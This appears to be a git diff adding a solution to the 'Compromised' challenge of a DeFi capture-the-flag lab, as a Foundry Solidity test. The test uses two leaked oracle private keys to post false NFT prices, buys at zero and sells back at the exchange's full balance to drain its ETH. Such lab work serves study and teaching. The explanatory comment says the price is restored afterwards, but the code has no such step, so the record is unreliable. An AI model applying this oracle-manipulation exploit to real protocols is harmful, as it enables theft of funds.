@@ -10,6 +10,7 @@ import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleIni
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -71,12 +72,53 @@ contract CompromisedChallenge is Test {
         assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
+    /*
+        The exploit takes advantage of the fact that two of the trusted oracle sources have been compromised,
+        allowing the attacker to manipulate the price of the NFT. By posting a very low price for the NFT from
+        the compromised sources, the attacker can buy an NFT at a fraction of its original cost. Then, by posting
+        a very high price from the same compromised sources, the attacker can sell the NFT back to the exchange
+        at an inflated price, draining its ETH balance. Finally, the attacker restores the NFT price to its original
+        value to avoid suspicion.
+    */
     function test_compromised() public checkSolved {
-        
+       
+        // The private keys corresponding to the trusted source addresses
+        address source1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        address source2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+
+        // Post a price of 0 for the NFT to two of the trusted sources
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        // Buy one NFT at a very low price
+        vm.startPrank(player);
+        exchange.buyOne{ value: PLAYER_INITIAL_ETH_BALANCE }();
+        vm.stopPrank();
+
+        // Post a price of 999 ETH for the NFT to two of the trusted sources
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        // Approve the exchange to transfer the NFT, then sell it
+        vm.startPrank(player);
+        nft.transferFrom(player, recovery, 0);
+        vm.stopPrank();
+        vm.startPrank(recovery);
+        nft.approve(address(exchange), 0);
+        exchange.sellOne(0);        
+        vm.stopPrank();
     }
+    
+
+    
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
